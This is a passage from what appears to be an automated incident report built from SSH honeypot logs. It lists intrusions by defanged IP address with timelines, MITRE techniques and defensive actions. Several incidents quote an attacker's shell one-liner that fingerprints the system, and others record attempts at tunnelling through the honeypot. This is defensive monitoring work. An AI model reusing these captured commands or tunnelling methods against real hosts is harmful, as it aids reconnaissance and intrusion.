**Recommended Actions:**
- [ ] Submit `1.247.245[.]61` to AbuseIPDB if not already reported
- [ ] Block `1.247.245[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b1aab351f94

| Field | Detail |
|---|---|
| **Source IP** | `87.117.32[.]22` |
| **First Seen** | 2026-07-31 06:17 |
| **Last Seen** | 2026-07-31 06:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 06:17:56` | `cowrie.session.connect` |
| `2026-07-31 06:17:56` | `cowrie.client.version` |
| `2026-07-31 06:17:56` | `cowrie.client.kex` |
| `2026-07-31 06:17:57` | `cowrie.login.success` |
| `2026-07-31 06:17:58` | `cowrie.direct-tcpip.request` |
| `2026-07-31 06:18:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.117.32[.]22` to AbuseIPDB if not already reported
- [ ] Block `87.117.32[.]22` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-247b6e1a4f33

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-31 06:24 |
| **Last Seen** | 2026-07-31 06:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 06:24:17` | `cowrie.session.connect` |
| `2026-07-31 06:24:17` | `cowrie.client.version` |
| `2026-07-31 06:24:17` | `cowrie.client.kex` |
| `2026-07-31 06:24:17` | `cowrie.login.success` |
| `2026-07-31 06:24:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58c0822a1206

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-31 06:24 |
| **Last Seen** | 2026-07-31 06:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 06:24:17` | `cowrie.session.connect` |
| `2026-07-31 06:24:17` | `cowrie.client.version` |
| `2026-07-31 06:24:17` | `cowrie.client.kex` |
| `2026-07-31 06:24:18` | `cowrie.login.success` |
| `2026-07-31 06:24:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c2c75239ca7

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]131` |
| **First Seen** | 2026-07-31 06:26 |
| **Last Seen** | 2026-07-31 06:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 06:26:56` | `cowrie.session.connect` |
| `2026-07-31 06:26:57` | `cowrie.client.version` |
| `2026-07-31 06:26:57` | `cowrie.client.kex` |
| `2026-07-31 06:26:58` | `cowrie.login.success` |
| `2026-07-31 06:26:58` | `cowrie.direct-tcpip.request` |
| `2026-07-31 06:27:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]131` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]131` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fec410cd71ec

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-07-31 06:27 |
| **Last Seen** | 2026-07-31 06:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 06:27:04` | `cowrie.session.connect` |
| `2026-07-31 06:27:04` | `cowrie.client.version` |
| `2026-07-31 06:27:04` | `cowrie.client.kex` |
| `2026-07-31 06:27:06` | `cowrie.login.success` |
| `2026-07-31 06:27:07` | `cowrie.direct-tcpip.request` |
| `2026-07-31 06:27:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3984debd845

| Field | Detail |
|---|---|
| **Source IP** | `118.26.111[.]107` |
| **First Seen** | 2026-07-31 06:30 |
| **Last Seen** | 2026-07-31 06:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 06:30:12` | `cowrie.session.connect` |
| `2026-07-31 06:30:12` | `cowrie.client.version` |
| `2026-07-31 06:30:12` | `cowrie.client.kex` |
| `2026-07-31 06:30:13` | `cowrie.login.success` |
| `2026-07-31 06:30:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.111[.]107` to AbuseIPDB if not already reported
- [ ] Block `118.26.111[.]107` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3074af42bdd9

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-31 06:30 |
| **Last Seen** | 2026-07-31 06:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 06:30:13` | `cowrie.session.connect` |
| `2026-07-31 06:30:13` | `cowrie.client.version` |
| `2026-07-31 06:30:14` | `cowrie.client.kex` |
| `2026-07-31 06:30:14` | `cowrie.login.success` |
| `2026-07-31 06:30:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f205b9a9878f

| Field | Detail |
|---|---|
| **Source IP** | `200.105.141[.]172` |
| **First Seen** | 2026-07-31 06:43 |
| **Last Seen** | 2026-07-31 06:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 06:43:42` | `cowrie.session.connect` |
| `2026-07-31 06:43:43` | `cowrie.client.version` |
| `2026-07-31 06:43:43` | `cowrie.client.kex` |
| `2026-07-31 06:43:44` | `cowrie.login.success` |
| `2026-07-31 06:43:45` | `cowrie.direct-tcpip.request` |
| `2026-07-31 06:43:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.105.141[.]172` to AbuseIPDB if not already reported
- [ ] Block `200.105.141[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41ecc63d6e71

| Field | Detail |
|---|---|
| **Source IP** | `218.4.156[.]254` |
| **First Seen** | 2026-07-31 06:43 |
| **Last Seen** | 2026-07-31 06:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 06:43:50` | `cowrie.session.connect` |
| `2026-07-31 06:43:51` | `cowrie.client.version` |
| `2026-07-31 06:43:51` | `cowrie.client.kex` |
| `2026-07-31 06:43:53` | `cowrie.login.success` |
| `2026-07-31 06:43:54` | `cowrie.direct-tcpip.request` |
| `2026-07-31 06:43:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.4.156[.]254` to AbuseIPDB if not already reported
- [ ] Block `218.4.156[.]254` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff295d3cc75e

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-31 06:50 |
| **Last Seen** | 2026-07-31 06:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 06:50:55` | `cowrie.session.connect` |
| `2026-07-31 06:50:55` | `cowrie.client.version` |
| `2026-07-31 06:50:55` | `cowrie.client.kex` |
| `2026-07-31 06:50:56` | `cowrie.login.success` |
| `2026-07-31 06:50:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb3b3f8c6235

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-31 06:50 |
| **Last Seen** | 2026-07-31 06:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 06:50:56` | `cowrie.session.connect` |
| `2026-07-31 06:50:56` | `cowrie.client.version` |
| `2026-07-31 06:50:56` | `cowrie.client.kex` |
| `2026-07-31 06:50:57` | `cowrie.login.success` |
| `2026-07-31 06:50:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bdef657ae6f

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 06:57 |
| **Last Seen** | 2026-07-31 06:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 06:57:16` | `cowrie.session.connect` |
| `2026-07-31 06:57:17` | `cowrie.client.version` |
| `2026-07-31 06:57:17` | `cowrie.client.kex` |
| `2026-07-31 06:57:21` | `cowrie.login.success` |
| `2026-07-31 06:57:23` | `cowrie.session.params` |
| `2026-07-31 06:57:23` | `cowrie.command.input` |
| `2026-07-31 06:57:23` | `cowrie.command.input` |
| `2026-07-31 06:57:23` | `cowrie.command.input` |
| `2026-07-31 06:57:23` | `cowrie.command.input` |
| `2026-07-31 06:57:23` | `cowrie.command.input` |
| `2026-07-31 06:57:23` | `cowrie.command.success` |
| `2026-07-31 06:57:23` | `cowrie.command.input` |
| `2026-07-31 06:57:23` | `cowrie.command.input` |
| `2026-07-31 06:57:23` | `cowrie.command.input` |
| `2026-07-31 06:57:23` | `cowrie.command.input` |
| `2026-07-31 06:57:24` | `cowrie.log.closed` |
| `2026-07-31 06:57:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86c563db39f7

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 06:59 |
| **Last Seen** | 2026-07-31 06:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 06:59:47` | `cowrie.session.connect` |
| `2026-07-31 06:59:47` | `cowrie.client.version` |
| `2026-07-31 06:59:47` | `cowrie.client.kex` |
| `2026-07-31 06:59:48` | `cowrie.login.success` |
| `2026-07-31 06:59:49` | `cowrie.session.params` |
| `2026-07-31 06:59:49` | `cowrie.command.input` |
| `2026-07-31 06:59:49` | `cowrie.command.input` |
| `2026-07-31 06:59:49` | `cowrie.command.input` |
| `2026-07-31 06:59:49` | `cowrie.command.input` |
| `2026-07-31 06:59:49` | `cowrie.command.input` |
| `2026-07-31 06:59:49` | `cowrie.command.success` |
| `2026-07-31 06:59:49` | `cowrie.command.input` |
| `2026-07-31 06:59:49` | `cowrie.command.input` |
| `2026-07-31 06:59:49` | `cowrie.command.input` |
| `2026-07-31 06:59:49` | `cowrie.command.input` |
| `2026-07-31 06:59:50` | `cowrie.log.closed` |
| `2026-07-31 06:59:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42a2f323354c

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 07:02 |
| **Last Seen** | 2026-07-31 07:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:02:49` | `cowrie.session.connect` |
| `2026-07-31 07:02:50` | `cowrie.client.version` |
| `2026-07-31 07:02:50` | `cowrie.client.kex` |
| `2026-07-31 07:02:52` | `cowrie.login.success` |
| `2026-07-31 07:02:53` | `cowrie.session.params` |
| `2026-07-31 07:02:53` | `cowrie.command.input` |
| `2026-07-31 07:02:53` | `cowrie.command.input` |
| `2026-07-31 07:02:53` | `cowrie.command.input` |
| `2026-07-31 07:02:53` | `cowrie.command.input` |
| `2026-07-31 07:02:53` | `cowrie.command.input` |
| `2026-07-31 07:02:53` | `cowrie.command.success` |
| `2026-07-31 07:02:53` | `cowrie.command.input` |
| `2026-07-31 07:02:53` | `cowrie.command.input` |
| `2026-07-31 07:02:53` | `cowrie.command.input` |
| `2026-07-31 07:02:53` | `cowrie.command.input` |
| `2026-07-31 07:02:54` | `cowrie.log.closed` |
| `2026-07-31 07:02:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb9caad8c6bb

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]60` |
| **First Seen** | 2026-07-31 07:04 |
| **Last Seen** | 2026-07-31 07:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:04:30` | `cowrie.session.connect` |
| `2026-07-31 07:04:30` | `cowrie.client.version` |
| `2026-07-31 07:04:30` | `cowrie.client.kex` |
| `2026-07-31 07:04:32` | `cowrie.login.success` |
| `2026-07-31 07:04:32` | `cowrie.direct-tcpip.request` |
| `2026-07-31 07:04:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]60` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bf9e8f8eded

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-07-31 07:04 |
| **Last Seen** | 2026-07-31 07:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:04:42` | `cowrie.session.connect` |
| `2026-07-31 07:04:43` | `cowrie.client.version` |
| `2026-07-31 07:04:43` | `cowrie.client.kex` |
| `2026-07-31 07:04:44` | `cowrie.login.success` |
| `2026-07-31 07:04:44` | `cowrie.direct-tcpip.request` |
| `2026-07-31 07:04:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf1dba01365b

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 07:05 |
| **Last Seen** | 2026-07-31 07:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:05:35` | `cowrie.session.connect` |
| `2026-07-31 07:05:35` | `cowrie.client.version` |
| `2026-07-31 07:05:35` | `cowrie.client.kex` |
| `2026-07-31 07:05:37` | `cowrie.login.success` |
| `2026-07-31 07:05:38` | `cowrie.session.params` |
| `2026-07-31 07:05:38` | `cowrie.command.input` |
| `2026-07-31 07:05:38` | `cowrie.command.input` |
| `2026-07-31 07:05:38` | `cowrie.command.input` |
| `2026-07-31 07:05:38` | `cowrie.command.input` |
| `2026-07-31 07:05:38` | `cowrie.command.input` |
| `2026-07-31 07:05:38` | `cowrie.command.success` |
| `2026-07-31 07:05:38` | `cowrie.command.input` |
| `2026-07-31 07:05:38` | `cowrie.command.input` |
| `2026-07-31 07:05:38` | `cowrie.command.input` |
| `2026-07-31 07:05:38` | `cowrie.command.input` |
| `2026-07-31 07:05:39` | `cowrie.log.closed` |
| `2026-07-31 07:05:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b49a964c91b

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 07:08 |
| **Last Seen** | 2026-07-31 07:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:08:16` | `cowrie.session.connect` |
| `2026-07-31 07:08:16` | `cowrie.client.version` |
| `2026-07-31 07:08:16` | `cowrie.client.kex` |
| `2026-07-31 07:08:18` | `cowrie.login.success` |
| `2026-07-31 07:08:19` | `cowrie.session.params` |
| `2026-07-31 07:08:19` | `cowrie.command.input` |
| `2026-07-31 07:08:19` | `cowrie.command.input` |
| `2026-07-31 07:08:19` | `cowrie.command.input` |
| `2026-07-31 07:08:19` | `cowrie.command.input` |
| `2026-07-31 07:08:19` | `cowrie.command.input` |
| `2026-07-31 07:08:19` | `cowrie.command.success` |
| `2026-07-31 07:08:19` | `cowrie.command.input` |
| `2026-07-31 07:08:19` | `cowrie.command.input` |
| `2026-07-31 07:08:19` | `cowrie.command.input` |
| `2026-07-31 07:08:19` | `cowrie.command.input` |
| `2026-07-31 07:08:19` | `cowrie.log.closed` |
| `2026-07-31 07:08:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fb711edb24f

| Field | Detail |
|---|---|
| **Source IP** | `111.45.29[.]88` |
| **First Seen** | 2026-07-31 07:08 |
| **Last Seen** | 2026-07-31 07:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:08:28` | `cowrie.session.connect` |
| `2026-07-31 07:08:28` | `cowrie.client.version` |
| `2026-07-31 07:08:28` | `cowrie.client.kex` |
| `2026-07-31 07:08:33` | `cowrie.login.success` |
| `2026-07-31 07:08:35` | `cowrie.session.params` |
| `2026-07-31 07:08:35` | `cowrie.command.input` |
| `2026-07-31 07:08:35` | `cowrie.log.closed` |
| `2026-07-31 07:08:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.45.29[.]88` to AbuseIPDB if not already reported
- [ ] Block `111.45.29[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b26233073746

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-31 07:09 |
| **Last Seen** | 2026-07-31 07:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:09:17` | `cowrie.session.connect` |
| `2026-07-31 07:09:17` | `cowrie.client.version` |
| `2026-07-31 07:09:17` | `cowrie.client.kex` |
| `2026-07-31 07:09:17` | `cowrie.login.success` |
| `2026-07-31 07:09:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13a134f499b1

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-31 07:09 |
| **Last Seen** | 2026-07-31 07:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:09:17` | `cowrie.session.connect` |
| `2026-07-31 07:09:17` | `cowrie.client.version` |
| `2026-07-31 07:09:17` | `cowrie.client.kex` |
| `2026-07-31 07:09:18` | `cowrie.login.success` |
| `2026-07-31 07:09:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75a08d3a048c

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 07:10 |
| **Last Seen** | 2026-07-31 07:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
